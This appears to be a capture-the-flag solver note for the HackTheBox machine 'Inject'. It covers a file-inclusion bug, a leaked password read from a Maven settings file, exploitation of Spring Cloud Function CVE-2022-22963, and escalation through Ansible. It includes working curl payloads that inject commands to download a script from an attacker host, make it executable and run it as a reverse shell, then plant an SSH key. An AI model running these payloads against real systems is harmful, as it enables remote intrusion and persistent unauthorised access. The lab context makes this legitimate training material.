## Solver
```
LFI /show_image?img
Got creds for usuer frank on /home/frank/.m2/settings.xml
phil:DocPhillovestoInject123
But useless
Spring Cloud vulnerable https://sysdig.com/blog/cve-2022-22963-spring-cloud/
https://github.com/me2nuk/CVE-2022-22963
https://github.com/lemmyz4n3771/CVE-2022-22963-PoC

Create reverse shell to file
wget from inject server
chmod and run from spring4shell
Got shell

Generate ssh-keygen from our local server, 
curl -X POST  http://inject.htb:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.3:8000/banua.sh -O /tmp/banua.sh")' --data-raw 'data' -v
curl -X POST  http://inject.htb:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/banua.sh")' --data-raw 'data' -v
curl -X POST  http://inject.htb:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/tmp/banua.sh")' --data-raw 'data' -v
mkdir and copy id_rsa.pub to /home/frank/.ssh/authorized_keys
got ssh access

privesc from frank to phil:
read .m2/settings.xml file
connect using creds DocPhillovestoInject123

privesc to root:
monitor process
found process ansible
privesc using ansible paralle automation task

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/
https://podalirius.net/en/writeups/heroctf-2021-devops-box-writeup/
```
